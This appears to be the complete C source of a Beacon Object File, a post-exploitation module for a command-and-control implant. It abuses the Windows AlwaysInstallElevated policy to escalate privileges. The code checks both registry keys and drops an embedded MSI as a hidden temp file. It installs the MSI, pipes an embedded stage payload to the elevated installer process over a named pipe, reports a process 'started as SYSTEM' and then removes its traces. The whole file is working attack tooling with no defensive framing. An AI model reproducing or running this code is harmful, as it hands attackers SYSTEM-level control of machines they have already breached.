#define UNICODE
#define _UNICODE
#include <windows.h>
#include <msi.h>
#include "bof.h"
#include "package.h"
#include "stage.h"

#define PRODUCT_CODE L"{8B046BA5-694D-4F67-98EA-6EDE8F621497}"
#define CHANNEL_NAME L"\\\\.\\pipe\\InstallerBridge"
#define TIMEOUT_MS 30000
#define MAX_STAGE_SIZE (16 * 1024 * 1024)

DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegOpenKeyExW(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegQueryValueExW(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegCloseKey(HKEY);

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetTempPathW(DWORD, LPWSTR);
DECLSPEC_IMPORT UINT WINAPI KERNEL32$GetTempFileNameW(LPCWSTR, LPCWSTR, UINT, LPWSTR);
DECLSPEC_IMPORT int WINAPI KERNEL32$lstrlenW(LPCWSTR);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$DeleteFileW(LPCWSTR);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateNamedPipeW(LPCWSTR, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, LPSECURITY_ATTRIBUTES);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ConnectNamedPipe(HANDLE, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$DisconnectNamedPipe(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateEventW(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$SetEvent(HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ResetEvent(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForMultipleObjects(DWORD, const HANDLE *, BOOL, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GetOverlappedResult(HANDLE, LPOVERLAPPED, LPDWORD, BOOL);

DECLSPEC_IMPORT UINT WINAPI MSI$MsiInstallProductW(LPCWSTR, LPCWSTR);
DECLSPEC_IMPORT UINT WINAPI MSI$MsiConfigureProductW(LPCWSTR, int, INSTALLSTATE);

typedef struct {
    LPCWSTR path;
    LPCWSTR properties;
    UINT status;
} PACKAGE_TASK;

typedef struct {
    DWORD status;
    DWORD process_id;
} BRIDGE_REPLY;

static BOOL setting_enabled(HKEY root)
{
    HKEY key = NULL;
    DWORD type = 0;
    DWORD value = 0;
    DWORD size = sizeof(value);
    LONG status;

    status = ADVAPI32$RegOpenKeyExW(
        root,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
        0,
        KEY_QUERY_VALUE,
        &key
    );
    if (status != ERROR_SUCCESS) {
        return FALSE;
    }

    status = ADVAPI32$RegQueryValueExW(
        key,
        L"AlwaysInstallElevated",
        NULL,
        &type,
        (LPBYTE)&value,
        &size
    );
    ADVAPI32$RegCloseKey(key);
    return status == ERROR_SUCCESS && type == REG_DWORD && value == 1;
}

static DWORD WINAPI install_package(LPVOID parameter)
{
    PACKAGE_TASK *task = (PACKAGE_TASK *)parameter;
    task->status = MSI$MsiInstallProductW(task->path, task->properties);
    return task->status;
}

static BOOL write_package(LPWSTR path)
{
    WCHAR directory[MAX_PATH];
    HANDLE file;
    DWORD written = 0;
    int length;

    if (!KERNEL32$GetTempPathW(MAX_PATH, directory) ||
        !KERNEL32$GetTempFileNameW(directory, L"ibg", 0, path)) {
        return FALSE;
    }

    KERNEL32$DeleteFileW(path);
    length = KERNEL32$lstrlenW(path);
    if (length < 3) {
        return FALSE;
    }
    path[length - 3] = L'm';
    path[length - 2] = L's';
    path[length - 1] = L'i';

    file = KERNEL32$CreateFileW(
        path,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY,
        NULL
    );
    if (file == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    if (!KERNEL32$WriteFile(
            file,
            package_data,
            (DWORD)package_data_len,
            &written,
            NULL) || written != package_data_len) {
        KERNEL32$CloseHandle(file);
        KERNEL32$DeleteFileW(path);
        return FALSE;
    }

    KERNEL32$CloseHandle(file);
    return TRUE;
}

static BOOL transfer(
    HANDLE channel,
    HANDLE event,
    LPVOID buffer,
    DWORD size,
    BOOL send
)
{
    BYTE *cursor = (BYTE *)buffer;
    DWORD offset = 0;

    while (offset < size) {
        DWORD count = 0;
        DWORD error;
        OVERLAPPED operation;
        BOOL started;

        __builtin_memset(&operation, 0, sizeof(operation));
        KERNEL32$ResetEvent(event);
        operation.hEvent = event;

        if (send) {
            started = KERNEL32$WriteFile(
                channel,
                cursor + offset,
                size - offset,
                &count,
                &operation
            );
        } else {
            started = KERNEL32$ReadFile(
                channel,
                cursor + offset,
                size - offset,
                &count,
                &operation
            );
        }

        if (!started) {
            error = KERNEL32$GetLastError();
            if (error != ERROR_IO_PENDING ||
                KERNEL32$WaitForSingleObject(event, TIMEOUT_MS) != WAIT_OBJECT_0 ||
                !KERNEL32$GetOverlappedResult(channel, &operation, &count, FALSE)) {
                return FALSE;
            }
        }
        if (!count) {
            return FALSE;
        }
        offset += count;
    }
    return TRUE;
}

void go(char *args, int length)
{
    WCHAR package_path[MAX_PATH] = {0};
    WCHAR properties[] = L"ALLUSERS=1 REBOOT=ReallySuppress";
    HANDLE channel = INVALID_HANDLE_VALUE;
    HANDLE connect_event = NULL;
    HANDLE transfer_event = NULL;
    HANDLE worker = NULL;
    HANDLE waits[2];
    OVERLAPPED connection;
    PACKAGE_TASK task;
    BRIDGE_REPLY reply = {0};
    DWORD stage_length = (DWORD)stage_size;
    DWORD wait_status;
    DWORD error;
    BOOL connected = FALSE;
    BOOL finished = FALSE;

    (void)args;
    (void)length;

    if (!stage_length || stage_length > MAX_STAGE_SIZE) {
        BeaconPrintf(OUTPUT_ERROR, "stage must be between 1 byte and 16 MiB");
        return;
    }
    if (!setting_enabled(HKEY_LOCAL_MACHINE) ||
        !setting_enabled(HKEY_CURRENT_USER)) {
        BeaconPrintf(OUTPUT_ERROR, "AlwaysInstallElevated is not enabled in HKLM and HKCU");
        return;
    }

    MSI$MsiConfigureProductW(PRODUCT_CODE, INSTALLLEVEL_DEFAULT, INSTALLSTATE_ABSENT);

    connect_event = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);
    transfer_event = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!connect_event || !transfer_event) {
        BeaconPrintf(OUTPUT_ERROR, "event setup failed: %lu", KERNEL32$GetLastError());
        goto cleanup;
    }

    channel = KERNEL32$CreateNamedPipeW(
        CHANNEL_NAME,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1,
        65536,
        65536,
        TIMEOUT_MS,
        NULL
    );
    if (channel == INVALID_HANDLE_VALUE) {
        BeaconPrintf(OUTPUT_ERROR, "channel setup failed: %lu", KERNEL32$GetLastError());
        goto cleanup;
    }

    __builtin_memset(&connection, 0, sizeof(connection));
    connection.hEvent = connect_event;
    if (KERNEL32$ConnectNamedPipe(channel, &connection)) {
        connected = TRUE;
        KERNEL32$SetEvent(connect_event);
    } else {
        error = KERNEL32$GetLastError();
        if (error == ERROR_PIPE_CONNECTED) {
            connected = TRUE;
            KERNEL32$SetEvent(connect_event);
        } else if (error != ERROR_IO_PENDING) {
            BeaconPrintf(OUTPUT_ERROR, "channel connection failed: %lu", error);
            goto cleanup;
        }
    }

    if (!write_package(package_path)) {
        BeaconPrintf(OUTPUT_ERROR, "package write failed: %lu", KERNEL32$GetLastError());
        goto cleanup;
    }

    task.path = package_path;
    task.properties = properties;
    task.status = ERROR_INSTALL_FAILURE;
    worker = KERNEL32$CreateThread(NULL, 0, install_package, &task, 0, NULL);
    if (!worker) {
        BeaconPrintf(OUTPUT_ERROR, "installer start failed: %lu", KERNEL32$GetLastError());
        goto cleanup;
    }

    waits[0] = connect_event;
    waits[1] = worker;
    wait_status = KERNEL32$WaitForMultipleObjects(2, waits, FALSE, TIMEOUT_MS);
    if (wait_status == WAIT_OBJECT_0 + 1) {
        finished = TRUE;
        BeaconPrintf(OUTPUT_ERROR, "installer exited before connection: %u", task.status);
        goto cleanup;
    }
    if (wait_status != WAIT_OBJECT_0) {
        BeaconPrintf(OUTPUT_ERROR, "connection timed out");
        goto cleanup;
    }
    connected = TRUE;

    if (!transfer(channel, transfer_event, &stage_length, sizeof(stage_length), TRUE) ||
        !transfer(channel, transfer_event, stage_data, stage_length, TRUE) ||
        !transfer(channel, transfer_event, &reply, sizeof(reply), FALSE)) {
        BeaconPrintf(OUTPUT_ERROR, "transfer failed: %lu", KERNEL32$GetLastError());
        goto cleanup;
    }
    if (reply.status != ERROR_SUCCESS) {
        BeaconPrintf(OUTPUT_ERROR, "bridge failed: %lu", reply.status);
        goto cleanup;
    }

    wait_status = KERNEL32$WaitForSingleObject(worker, TIMEOUT_MS);
    if (wait_status != WAIT_OBJECT_0) {
        BeaconPrintf(OUTPUT_ERROR, "process %lu started; installer cleanup timed out", reply.process_id);
        goto cleanup;
    }
    finished = TRUE;
    if (task.status != ERROR_SUCCESS &&
        task.status != ERROR_SUCCESS_REBOOT_REQUIRED) {
        BeaconPrintf(OUTPUT_ERROR, "process %lu started; installer returned %u", reply.process_id, task.status);
        goto cleanup;
    }

    BeaconPrintf(OUTPUT_TEXT, "started as SYSTEM in PID %lu", reply.process_id);

cleanup:
    if (worker && !finished) {
        KERNEL32$WaitForSingleObject(worker, INFINITE);
        finished = TRUE;
    }
    if (channel != INVALID_HANDLE_VALUE) {
        if (connected) {
            KERNEL32$DisconnectNamedPipe(channel);
        }
        KERNEL32$CloseHandle(channel);
    }
    if (worker) {
        KERNEL32$CloseHandle(worker);
    }
    if (connect_event) {
        KERNEL32$CloseHandle(connect_event);
    }
    if (transfer_event) {
        KERNEL32$CloseHandle(transfer_event);
    }
    if (package_path[0] && finished) {
        MSI$MsiConfigureProductW(PRODUCT_CODE, INSTALLLEVEL_DEFAULT, INSTALLSTATE_ABSENT);
        KERNEL32$DeleteFileW(package_path);
    }
}
